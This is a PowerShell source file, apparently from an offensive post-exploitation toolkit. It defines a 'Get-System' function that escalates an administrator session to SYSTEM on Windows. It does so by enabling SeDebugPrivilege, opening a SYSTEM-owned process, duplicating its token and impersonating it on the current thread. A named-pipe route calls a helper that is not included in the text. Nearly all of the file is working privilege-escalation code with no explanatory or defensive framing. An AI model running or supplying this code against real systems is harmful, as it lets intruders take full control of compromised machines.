function Get-System {
    [CmdletBinding(DefaultParameterSetName = 'NamedPipe')]
    param(
        [Parameter(ParameterSetName = "NamedPipe")]
        [Parameter(ParameterSetName = "Token")]
        [String]
        [ValidateSet("NamedPipe", "Token")]
        $Technique = 'NamedPipe',

        [Parameter(ParameterSetName = "NamedPipe")]
        [String]
        $ServiceName = 'TestSVC',

        [Parameter(ParameterSetName = "NamedPipe")]
        [String]
        $PipeName = 'TestSVC',

        [Parameter(ParameterSetName = "RevToSelf")]
        [Switch]
        $RevToSelf,

        [Parameter(ParameterSetName = "WhoAmI")]
        [Switch]
        $WhoAmI
    )

    $ErrorActionPreference = "Stop"

    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]

            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),

            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')

        Write-Output $TypeBuilder.CreateType()
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]

            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,

            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }


    Function Local:Get-SystemToken {
        [CmdletBinding()] param()

        $DynAssembly = New-Object Reflection.AssemblyName('AdjPriv')
        $AssemblyBuilder = [Appdomain]::Currentdomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('AdjPriv', $False)
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'

        $TokPriv1LuidTypeBuilder = $ModuleBuilder.DefineType('TokPriv1Luid', $Attributes, [System.ValueType])
        $TokPriv1LuidTypeBuilder.DefineField('Count', [Int32], 'Public') | Out-Null
        $TokPriv1LuidTypeBuilder.DefineField('Luid', [Int64], 'Public') | Out-Null
        $TokPriv1LuidTypeBuilder.DefineField('Attr', [Int32], 'Public') | Out-Null
        $TokPriv1LuidStruct = $TokPriv1LuidTypeBuilder.CreateType()

        $LuidTypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType])
        $LuidTypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $LuidTypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LuidStruct = $LuidTypeBuilder.CreateType()

        $Luid_and_AttributesTypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType])
        $Luid_and_AttributesTypeBuilder.DefineField('Luid', $LuidStruct, 'Public') | Out-Null
        $Luid_and_AttributesTypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $Luid_and_AttributesStruct = $Luid_and_AttributesTypeBuilder.CreateType()

        $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
        $ConstructorValue = [Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

        $TokenPrivilegesTypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType])
        $TokenPrivilegesTypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $PrivilegesField = $TokenPrivilegesTypeBuilder.DefineField('Privileges', $Luid_and_AttributesStruct.MakeArrayType(), 'Public')
        $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 1))
        $PrivilegesField.SetCustomAttribute($AttribBuilder)
        $TokenPrivilegesStruct = $TokenPrivilegesTypeBuilder.CreateType()

        $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder(
            ([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]),
            'advapi32.dll',
            @([Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')),
            @([Bool] $True)
        )

        $AttribBuilder2 = New-Object Reflection.Emit.CustomAttributeBuilder(
            ([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]),
            'kernel32.dll',
            @([Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')),
            @([Bool] $True)
        )

        $Win32TypeBuilder = $ModuleBuilder.DefineType('Win32Methods', $Attributes, [ValueType])
        $Win32TypeBuilder.DefinePInvokeMethod(
            'OpenProcess',
            'kernel32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [IntPtr],
            @([UInt32], [Bool], [UInt32]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder2)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'CloseHandle',
            'kernel32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder2)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'DuplicateToken',
            'advapi32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [Int32], [IntPtr].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'SetThreadToken',
            'advapi32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [IntPtr]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'OpenProcessToken',
            'advapi32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [UInt32], [IntPtr].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'LookupPrivilegeValue',
            'advapi32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([String], [String], [IntPtr].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'AdjustTokenPrivileges',
            'advapi32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [Bool], $TokPriv1LuidStruct.MakeByRefType(),[Int32], [IntPtr], [IntPtr]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder)

        $Win32Methods = $Win32TypeBuilder.CreateType()

        $Win32Native = [Int32].Assembly.GetTypes() | ? {$_.Name -eq 'Win32Native'}
        $GetCurrentProcess = $Win32Native.GetMethod(
            'GetCurrentProcess',
            [Reflection.BindingFlags] 'NonPublic, Static'
        )

        $SE_PRIVILEGE_ENABLED = 0x00000002
        $STANDARD_RIGHTS_REQUIRED = 0x000F0000
        $STANDARD_RIGHTS_READ = 0x00020000
        $TOKEN_ASSIGN_PRIMARY = 0x00000001
        $TOKEN_DUPLICATE = 0x00000002
        $TOKEN_IMPERSONATE = 0x00000004
        $TOKEN_QUERY = 0x00000008
        $TOKEN_QUERY_SOURCE = 0x00000010
        $TOKEN_ADJUST_PRIVILEGES = 0x00000020
        $TOKEN_ADJUST_GROUPS = 0x00000040
        $TOKEN_ADJUST_DEFAULT = 0x00000080
        $TOKEN_ADJUST_SESSIONID = 0x00000100
        $TOKEN_READ = $STANDARD_RIGHTS_READ -bor $TOKEN_QUERY
        $TOKEN_ALL_ACCESS = $STANDARD_RIGHTS_REQUIRED -bor
            $TOKEN_ASSIGN_PRIMARY -bor
            $TOKEN_DUPLICATE -bor
            $TOKEN_IMPERSONATE -bor
            $TOKEN_QUERY -bor
            $TOKEN_QUERY_SOURCE -bor
            $TOKEN_ADJUST_PRIVILEGES -bor
            $TOKEN_ADJUST_GROUPS -bor
            $TOKEN_ADJUST_DEFAULT -bor
            $TOKEN_ADJUST_SESSIONID

        [long]$Luid = 0

        $tokPriv1Luid = [Activator]::CreateInstance($TokPriv1LuidStruct)
        $tokPriv1Luid.Count = 1
        $tokPriv1Luid.Luid = $Luid
        $tokPriv1Luid.Attr = $SE_PRIVILEGE_ENABLED

        $RetVal = $Win32Methods::LookupPrivilegeValue($Null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid)

        $htoken = [IntPtr]::Zero
        $RetVal = $Win32Methods::OpenProcessToken($GetCurrentProcess.Invoke($Null, @()), $TOKEN_ALL_ACCESS, [ref]$htoken)

        $tokenPrivileges = [Activator]::CreateInstance($TokenPrivilegesStruct)
        $RetVal = $Win32Methods::AdjustTokenPrivileges($htoken, $False, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero)

        if(-not($RetVal)) {
            Write-Error "AdjustTokenPrivileges failed, RetVal : $RetVal" -ErrorAction Stop
        }

        $LocalSystemNTAccount = (New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList ([Security.Principal.WellKnownSidType]::'LocalSystemSid', $null)).Translate([Security.Principal.NTAccount]).Value

        $SystemHandle = Get-WmiObject -Class Win32_Process | ForEach-Object {
            try {
                $OwnerInfo = $_.GetOwner()
                if ($OwnerInfo.Domain -and $OwnerInfo.User) {
                    $OwnerString = "$($OwnerInfo.Domain)\$($OwnerInfo.User)".ToUpper()

                    if ($OwnerString -eq $LocalSystemNTAccount.ToUpper()) {
                        $Process = Get-Process -Id $_.ProcessId

                        $Handle = $Win32Methods::OpenProcess(0x0400, $False, $Process.Id)
                        if ($Handle) {
                            $Handle
                        }
                    }
                }
            }
            catch {}
        } | Where-Object {$_ -and ($_ -ne 0)} | Select -First 1

        if ((-not $SystemHandle) -or ($SystemHandle -eq 0)) {
            Write-Error 'Unable to obtain a handle to a system process.'
        }
        else {
            [IntPtr]$SystemToken = [IntPtr]::Zero
            $RetVal = $Win32Methods::OpenProcessToken(([IntPtr][Int] $SystemHandle), ($TOKEN_IMPERSONATE -bor $TOKEN_DUPLICATE), [ref]$SystemToken);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

            Write-Verbose "OpenProcessToken result: $RetVal"
            Write-Verbose "OpenProcessToken result: $LastError"

            [IntPtr]$DulicateTokenHandle = [IntPtr]::Zero
            $RetVal = $Win32Methods::DuplicateToken($SystemToken, 2, [ref]$DulicateTokenHandle);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

            Write-Verbose "DuplicateToken result: $LastError"

            $RetVal = $Win32Methods::SetThreadToken([IntPtr]::Zero, $DulicateTokenHandle);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if(-not($RetVal)) {
                Write-Error "SetThreadToken failed, RetVal : $RetVal" -ErrorAction Stop
            }

            Write-Verbose "SetThreadToken result: $LastError"
            $null = $Win32Methods::CloseHandle($Handle)
        }
    }

    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        Write-Error "Script must be run as administrator" -ErrorAction Stop
    }

    if([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') {
        Write-Error "Script must be run in STA mode, relaunch powershell.exe with -STA flag" -ErrorAction Stop
    }

    if($PSBoundParameters['WhoAmI']) {
        Write-Output "$([Environment]::UserDomainName)\$([Environment]::UserName)"
        return
    }

    elseif($PSBoundParameters['RevToSelf']) {
        $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
        $RevertToSelfDelegate = Get-DelegateType @() ([Bool])
        $RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)

        $RetVal = $RevertToSelf.Invoke()
        if($RetVal) {
            Write-Output "RevertToSelf successful."
        }
        else {
            Write-Warning "RevertToSelf failed."
        }
        Write-Output "Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
    }

    else {
        if($Technique -eq 'NamedPipe') {
            # if we're using named pipe impersonation with a service
            Get-SystemNamedPipe -ServiceName $ServiceName -PipeName $PipeName
        }
        else {
            # otherwise use token duplication
            Get-SystemToken
        }
        Write-Output "Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
    }
}
